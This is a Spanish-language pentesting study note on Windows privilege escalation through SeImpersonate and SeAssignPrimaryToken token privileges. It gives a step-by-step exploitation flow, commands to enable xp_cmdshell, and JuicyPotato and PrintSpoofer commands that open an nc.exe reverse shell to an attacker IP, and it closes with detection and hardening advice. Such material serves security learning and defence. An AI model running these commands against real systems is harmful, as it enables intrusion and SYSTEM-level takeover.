# SeImpersonate y SeAssignPrimaryToken

## Introducción

El sistema Windows representa la identidad de cuentas y procesos mediante **tokens de acceso**. Dos privilegios críticos relacionados con la reutilización o asignación de tokens son **SeImpersonatePrivilege** y **SeAssignPrimaryTokenPrivilege**. Ambos permiten a procesos con los derechos adecuados actuar con el contexto de otros usuarios y, si se abusan en entornos no endurecidos, posibilitan escaladas locales a NT AUTHORITY/SYSTEM.

---

## Definición

* **SeImpersonatePrivilege**: "Impersonate a client after authentication" — permite a un proceso (o hilo) **impersonar** a un cliente autenticado (usar su token de impersonación) para acceder a recursos en nombre de ese cliente. A menudo este privilegio se le otorga a cuentas administrativas. Un ejemplo del uso de este token es mediante la función [`CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

`Nota`: `CreateProcessWithTokenW` es una función de la API Win32 que crea un nuevo proceso y permite lanzarlo con la identidad de un token dado. Requiere que el llamador tenga `SeImpersonatePrivilege`.  

* **SeAssignPrimaryTokenPrivilege**: "Replace a process level token" — permite crear o asignar **tokens primarios** a procesos (por ejemplo, usar la función `CreateProcessAsUser`) y es más restrictivo.

Diferencia práctica:

* *Impersonation token* suele estar asociado a un thread y se usa para actuar temporalmente como el cliente.
* *Primary token* se asigna a un proceso entero y permite crear procesos enteros bajo esa identidad.

---

## Contexto de abuso

Windows permite, por diseño, que procesos reutilicen tokens de otros procesos para realizar tareas con distintos niveles de privilegio; esa funcionalidad legítima puede ser abusada si cuentas de servicio tienen derechos de impersonación, permitiendo a un atacante conseguir contexto SYSTEM mediante técnicas tipo Potato:

* Servicios que atienden conexiones de cliente (IIS, SQL Server, servicios RPC/COM) a menudo necesitan impersonar al usuario que realiza la petición para acceder a recursos (carpetas compartidas, bases de datos, otros servicios). Por ello, las cuentas de estos servicios a veces tienen `SeImpersonate` habilitado.
* Si se obtiene ejecución en el contexto de uno de esos servicios (por ejemplo, nt service/mssql$..., IIS APPPOOL/defaultapppool), la presencia de `SeImpersonate` o `SeAssignPrimaryToken` puede permitir una escalada rápida a SYSTEM.

Ataque tipo potato:
El atacante “engaña” a un componente que corre como SYSTEM para que inicie comunicación con el proceso del atacante; durante esa interacción se produce la oportunidad para que el atacante obtenga/usar el token SYSTEM.

---

## Ejemplo de explotación (JuicyPotato / PrintSpoofer — flujo resumido)

1. Obtener RCE en contexto de un servicio (ej.: xp_cmdshell en SQL, web shell en IIS, Jenkins RCE).
2. Confirmar la cuenta del proceso: whoami (ej. nt service/mssql$sqlexpress01).
3. Comprobar privilegios: whoami /priv → comprobar SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
4. Subir herramienta de explotación (JuicyPotato.exe, PrintSpoofer.exe, nc.exe).
5. Ejecutar herramienta apuntando al CLSID/puerto COM apropiado y al payload (reverse shell).
6. Si tiene éxito, obtendrás un shell como NT AUTHORITY/SYSTEM.

---

## Comandos y ejemplos prácticos

* Comprobar identidad y privilegios:

  ```cmd
  whoami
  whoami /priv
  ```

* Habilitar xp_cmdshell (ejemplo con Impacket mssqlclient):

  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  ```

* Ejecutar JuicyPotato (ejemplo):

  ```cmd
  JuicyPotato.exe -l 53375 -p C:/Windows/System32/cmd.exe -a "/c C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
  ```

* Ejecutar PrintSpoofer (ejemplo):

  ```cmd
  PrintSpoofer.exe -c "C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe"
  ```

> Observación: JuicyPotato no funciona en builds recientes de Windows; en esos casos probar PrintSpoofer, RoguePotato u otras variantes.

---

## Detección (artefactos y logs)

* **Windows Security Event Log**:

  * 4624 / 4634 (logons), 4688 (creación de procesos) — buscar procesos inusuales creados por servicios.
* **Sysmon**:

  * EventID 1 (ProcessCreate): procesos hijos anómalos de servicios (ej. w3wp.exe -> cmd.exe).
  * EventID 10 (ProcessAccess): accesos entre procesos que indican token stealing.
  * EventID 3 (NetworkConnect): conexiones reversas (nc.exe).
* **EDR**: llamadas a APIs sensibles (CreateProcessWithTokenW, CreateProcessAsUser) y creación de procesos con tokens distintos deben alertar.
* Revisar named pipes y endpoints COM/RPC que estén siendo escuchados por procesos no habituales.

---

## Mitigaciones y hardening

* **Eliminar los privilegios** SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege de cuentas que no los necesiten (Local Security Policy -> User Rights Assignment o GPO).
* Ejecutar servicios con cuentas con menor privilegio (service accounts con permisos mínimos).
* Separar responsabilidades: no usar la misma cuenta para múltiples servicios críticos.
* Habilitar PPL / LSASS protections y tecnologías como Credential Guard cuando aplique.
* Implementar Sysmon + EDR con reglas que detecten procesos creados desde servicios y uso de APIs de token.
* Application whitelisting y bloqueo de ejecución de binarios no autorizados en servidores críticos.

---

## Checklist

* [ ] Obtener RCE en contexto de servicio.
* [ ] whoami y whoami /priv.
* [ ] Subir herramienta de explotación compatible con la versión de Windows objetivo.
* [ ] Intentar JuicyPotato → si falla, probar PrintSpoofer / RoguePotato / alternativas.
* [ ] Si obtienes SYSTEM, documentar evidencia y limpiar artefactos en entorno de laboratorio.

---

## Notas finales y recursos

* JuicyPotato, PrintSpoofer y RoguePotato son ejemplos públicos; su efectividad depende de la build de Windows.
* Consulta documentación técnica sobre tokens y las APIs CreateProcessWithTokenW, CreateProcessAsUser para profundizar.
* Siempre trabajar en entornos controlados y con autorización.

---

*Fin.*
